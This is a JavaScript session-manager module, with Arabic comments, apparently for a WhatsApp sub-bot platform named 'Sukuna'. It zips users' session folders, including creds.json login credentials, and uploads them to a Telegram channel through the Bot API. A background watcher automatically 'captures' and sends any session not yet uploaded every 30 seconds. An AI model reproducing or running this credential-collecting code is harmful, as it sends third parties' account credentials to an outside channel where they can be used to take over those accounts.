/**
 * ═══════════════════════════════════════════════════════
 * 📦 SESSION MANAGER | مدير جلسات منصة سوكونا
 * ═══════════════════════════════════════════════════════
 * 👑 المطور: آدم (شادو) | Adam (Shadow)
 * 🤖 البوت: سوكونا | Sukuna
 * 📜 الوصف: ضغط الجلسة + إرسالها لقناة تليجرام + مراقب تلقائي
 * ═══════════════════════════════════════════════════════
 */

import fs from 'fs'
import path from 'path'
import archiver from 'archiver'

const BASE = () => global.subSessionsDir || 'sessions/session-sub'

function ensureDir(d) {
  fs.mkdirSync(d, { recursive: true })
}

// ضغط مجلد إلى zip
export function zipDirectory(sourceDir, outPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(outPath)
    const archive = archiver('zip', { zlib: { level: 9 } })
    output.on('close', () => resolve(outPath))
    archive.on('error', err => reject(err))
    archive.pipe(output)
    archive.directory(sourceDir, false)
    archive.finalize()
  })
}

// إرسال ملف الـ zip لقناة تليجرام باستخدام بوت الموقع
export async function sendZipToTelegram(zipPath, caption) {
  const token = global.websiteBotToken
  const chatId = global.sessionsChannelId
  if (!token || !chatId) throw new Error('توكن الموقع أو معرف القناة غير مضبوط')

  const buffer = fs.readFileSync(zipPath)
  const blob = new Blob([buffer])
  const fd = new FormData()
  fd.append('chat_id', chatId)
  fd.append('caption', caption)
  fd.append('document', blob, path.basename(zipPath))

  const res = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
    method: 'POST',
    body: fd
  })
  const json = await res.json().catch(() => ({}))
  if (!json.ok) throw new Error(json.description || 'فشل الإرسال للتليجرام')
  return json
}

// نهائي: ينسخ الجلسة للمجلد الدائم + يضغطها + يبعتها
export async function finalizeSession(tempDir, number, meta = {}) {
  number = String(number || '').replace(/[^0-9]/g, '')
  if (!number) throw new Error('رقم الجلسة غير صالح')

  const base = BASE()
  ensureDir(base)

  const targetDir = path.join(base, number)
  if (fs.existsSync(targetDir)) fs.rmSync(targetDir, { recursive: true, force: true })
  ensureDir(targetDir)

  // نسخ ملفات الجلسة المؤقتة للمجلد الدائم
  fs.cpSync(tempDir, targetDir, { recursive: true })

  // ضغط المجلد
  const zipPath = path.join(base, `${number}.zip`)
  await zipDirectory(targetDir, zipPath)

  const caption = [
    '🕸 جلسة بوت فرعي جديدة — منصة سوكونا',
    `📱 الرقم: ${number}`,
    `🔗 الطريقة: ${meta.method || 'غير معروف'}`,
    `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}`
  ].join('\n')

  await sendZipToTelegram(zipPath, caption)

  // علامة إن الجلسة اتبعتت
  fs.writeFileSync(path.join(targetDir, '.sent'), Date.now().toString())
  fs.rmSync(zipPath, { force: true })

  // تنظيف المؤقت
  try { fs.rmSync(tempDir, { recursive: true, force: true }) } catch {}

  return { number, targetDir }
}

// مراقب تلقائي: كل فترة يشوف لو في جلسة مبعتتهاش ويبعتها
export function startSessionWatcher(intervalMs = 30000) {
  setInterval(async () => {
    const base = BASE()
    if (!fs.existsSync(base)) return

    for (const name of fs.readdirSync(base)) {
      const dir = path.join(base, name)
      if (!fs.statSync(dir).isDirectory()) continue

      const creds = path.join(dir, 'creds.json')
      const sent = path.join(dir, '.sent')

      if (fs.existsSync(creds) && !fs.existsSync(sent)) {
        try {
          const zipPath = path.join(base, `${name}.zip`)
          await zipDirectory(dir, zipPath)
          await sendZipToTelegram(zipPath, `🕸 جلسة غير مرسلة تم التقاطها تلقائياً\n📱 ${name}`)
          fs.writeFileSync(sent, Date.now().toString())
          fs.rmSync(zipPath, { force: true })
        } catch (e) {
          console.error('[WATCHER]', e.message)
        }
      }
    }
  }, intervalMs)
}